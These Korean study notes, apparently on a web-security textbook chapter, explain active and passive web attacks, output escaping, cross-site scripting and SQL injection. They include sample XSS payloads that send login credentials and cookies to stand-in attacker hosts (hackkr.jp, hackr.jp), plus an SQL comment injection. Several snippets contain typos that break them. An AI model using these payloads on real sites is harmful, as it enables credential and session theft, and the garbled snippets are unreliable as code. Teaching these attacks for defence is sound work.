# 11장. 웹 공격 기술

## 웹 공격 기술
- 현재 벌어지는 공격 대부분이 웹 사이트를 노린 것
- 그 중에서도 특히 웹 애플리케이션을 대상으로 많은 공격이 발생

### HTTP에는 보안 기능이 없다
- HTTP는 구조가 단순한 프로토콜
- HTTP vs SSH
  - SSH는 프로토콜 레벨에서 인증이나 세션 관련 기능이 준비되어 있지만 HTTP에는 없다.
  - SSH 서비스 셋업은 누구나 안전한 레벨까지 쉽게 구축 가능하지만 HTTP에서는 대부분 처음부터 개발하게 된다.
- 웹 애플리케이션에서 인증이나 세션 관리 기능을 개발자가 설계해야 한다.
- 그 결과, 보안 등급이 충분치 못하고 취약성이 있는 상태로 가동되고 있는 웹 애플리케이션이 있다.

### 리퀘스트는 클라이언트에서 변조 가능
- 웹 애플리케이션에 대한 공격은 HTTP 리퀘스트 메시지에 공격 코드를 실어서 실행된다.
- 쿼리나 폼, HTTP 헤더, 쿠키 등을 경유해서 보내져 웹 애플리케이션에 취약성이 있을 경우 정보를 도둑맞거나 권한을 빼앗길 수 있다.

### 웹 애플리케이션에 대한 공격 패턴
- 웹 애플리케이션에 대한 공격 패턴은 두 가지가 있다.
  - 능동적 공격
  - 수동적 공격
#### 서버를 노리는 능동적 공격
  - 공격자가 직접 웹 애플리케이션에 액세스해서 공격 코드를 보내는 타입의 공격
  - 서버 상의 리소스에 대해 직접 실행되기 때문에 공격자가 리소스에 액세스할 필요가 있음.
  - SQL 인젝션, OS 커맨드 인젝션
#### 유저를 노리는 수동적 공격
- 함정을 이용해 유저에게 공격 코드를 실행시키는 공격
- 공격자가 직접 웹 애플리케이션에 액세스해서 공격을 하지 않는다.
- 절차
  - 공격자가 설치한 함정에 유저를 유도함. 함정에는 공격 코드를 심어둔 HTTP 리퀘스트를 발생시키기 위한 장치 준비
  - 사용자가 함정에 걸리면 유저의 브라우저나 메일 클라이언트에서 함정을 열게 됨.
  - 함정에 걸리면 유저의 브라우저가 HTTP 리퀘스트를 웹 애플리케이션에 송신하고 공격 코드를 실행함.
  - 공격 코드를 실행하면 쿠키 등의 기밀 정보를 도둑 맞거나 로그인 중인 유저의 권한이 악용되는 등의 피해 발생
- 크로스 사이트 스크립팅(XSS), 크로스 사이트 리퀘스트 포저리(CSRF)

**유저가 처한 환경을 이용한 인트라넷 등에 대한 공격**
- 수동적 공격을 이용하면 인트라넷 같은 인터넷에서 직접 액세스할 수 없는 네트워크를 공격할 수 있다.
- 많은 인트라넷에서는 인터넷 상의 웹 사이트에 액세스하거나 인터넷에서 전송되어 온 메일을 읽을 수도 있기 때문에 공격자는 함정으로 유도하여 인트라넷을 공격할 수 있게 된다.

## 11.2 출력 값의 이스케이프 미비로 인한 취약성
- 웹 애플리케이션의 보안 대책을 실시하는 장소를 크게 나누면 다음과 같이 된다.
  - 클라이언트에서 체크
  - 웹 애플리케이션(서버 측)에서 체크
    - 입력값 체크
    - 출력값 체크

- 클라이언트 측에서의 체크는 대부분 JavaScript를 사용하는데, 변조되거나 무효화될 가능성이 있기 때문에 근본적인 보안 대책으로는 적합하지 않다.
- 웹 애플리케이션에서 처리한 데이터를 데이터베이스나 파일 시스템, HTML, 메일 등에 출력할 때 출력하는 곳에 따라 값을 이스케이프 처리하는 출력 값의 이스케이프가 보안 대책으로 중요

### 11.2 크로스 사이트 스크립팅
- 크로스 사이트 스크립팅(XSS)은 취약성이 있는 웹사이트를 방문한 사용자의 브라우저에서 부정한 HTML 태그나 JavaScript 등을 동작시키는 공격
- 동적으로 HTML을 생성하는 부분에서 취약성이 발생할 수 있다.
- 수동적 공격

![](https://3.bp.blogspot.com/-h8DgNsx8zhY/WCHPxBD4txI/AAAAAAAAC18/aMZJ85_yJU0vMYl8puDJZCDjJtlVYenFwCLcB/s1600/%25E1%2584%2589%25E1%2585%25B3%25E1%2584%258F%25E1%2585%25B3%25E1%2584%2585%25E1%2585%25B5%25E1%2586%25AB%25E1%2584%2589%25E1%2585%25A3%25E1%2586%25BA%2B2016-11-08%2B%25E1%2584%258B%25E1%2585%25A9%25E1%2584%2592%25E1%2585%25AE%2B10.14.22.png)

> 예시) 폼에 `<script>` 태그를 사용한 문자열을 입력하여 공격
**XSS는 공격자가 함정을 준비하는 수동적 공격**
- 예) URL의 쿼리에 ID를 지정함으로써 폼 내에 문자열을 보완하는 기능이 있는 웹사이트
  ```
  http://example.jp/login?ID=yama
  ```
  여기에 취약성이 있다고 파악한 공격자는 다음과 같은 함정을 작성한 후 교모한 내용의 메일이나 함정을 설치한 웹 페이지를 준비해서 유저가 URL을 클릭하도록 유도한다.
  ```javascript
  http://example.jp/login?ID="><script>var+f=document=>getElementById("login");+f.action="http://hackkr.jp/pwget";+f.method==>"get";</script><span+s="
  ```
  유저가 폼에 ID와 패스워드를 입력하면 공격자의 사이트로 송신되게 하여 빼앗을 수 있다.

#### 유저의 쿠키를 빼앗는 공격
- 폼에 함정을 설치하는 것 외에도 아래와 같은 스크립트를 추가하여 유저의 쿠키를 XSS로 빼앗을 수 있다.
  ```javascript
  <script src="http://hackr.jp/xss.js></script>
  ```
- 이 스크립트가 가리키는 http://hackr.jp/xss.js에는 아래의 JavaScript가 코딩되어 이다.
  ```javascript
  var content = escape(document.cookie);
  document.write("<img src="http://hackr.jp/?");
  document.write(content);
  document.write(">");
  ```
- XSS 취약성이 있는 웹 애플리케이션에서 JavaScript가 실행되면 해당 웹 애플리케이션의 도메인의 쿠키 정보에 액세스된다. 그리고 이 저보가 웹 사이트에 보내지고 액세스 로그에 기록된다.

### 11.2.2 SQL 인젝션
#### 부정한 SQL을 실행하는 SQL 인젝션
- SQL 인젝션 : 웹 애플리케이션을 이용하고 있는 데이터베이스에 SQL을 부정하게 실행하는 공격
- 커다란 위협을 일으킬 수 있는 취약성

**SQL 인젝션의 공격 사례**
- 웹 사이트에 [우에노 센]을 입력했을 때 이 값은 웹 애플리케이션 내부에서 SQL문에 전달되며 다음과 같이 구성된다.
  ```sql
  SELECT * FROM bookTbl WHERE author='우에노 센' and flag = 1;
  ```
- 조금 전 쿼리를 "우에노 센'--"으로 변경한다.
- 그럼 SQL문은 다음과 같이 구성된다.
  ```sql
  SELECT * FROM bookTbl WHERE author='우에노 센' --' and flag = 1;
  ```
- SQL문에서 "--" 이후는 주석으로 처리된다. 즉, `and flag=1`이라는 조건이 무시된다.

#### SQL 인젝션은 SQL 문장의 구문을 파괴하는 공격
- SQL 인젝션은 공격자에 의해 개발자가 의도하지 않는 형태로 SQL 문장이 변경되어 구조가 파괴되는 공격
